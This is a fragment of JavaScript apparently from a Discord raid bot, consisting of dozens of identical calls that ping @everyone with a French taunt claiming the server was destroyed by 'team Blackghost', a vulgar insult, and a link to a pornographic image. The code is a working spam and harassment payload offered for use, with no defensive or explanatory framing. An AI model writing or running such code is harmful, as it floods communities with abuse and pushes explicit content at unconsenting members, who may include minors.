    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
	}
});
